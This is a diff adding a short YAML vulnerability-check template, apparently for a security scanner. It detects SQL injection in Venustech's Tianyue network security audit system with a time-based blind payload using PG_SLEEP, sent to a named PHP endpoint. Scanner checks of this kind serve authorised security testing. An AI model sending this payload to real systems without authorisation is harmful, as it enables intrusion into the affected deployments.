@@ -1,0 +1,18 @@
+id: poc-yaml-qmxc-ty-network-security-audit-system-sql-injection
+info:
+  name: 启明星辰天玥网络安全审计系统 SQL 注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 天玥网络安全审计系统
+variables:
+  t1: random_int(5,10)
+requests:
+- method: POST
+  path: /ops/index.php?c=Reportguide&a=checkrn
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: checkname=123&tagid=123 AND 9523=(SELECT 9523 FROM PG_SLEEP({{.t1}}))--+
+  expression: status_code == 200 && duration >= t1 && content_type == "text/json"
+    && contains(body,"msg") && contains(body,"code") && contains(body,"status")
+transport: http
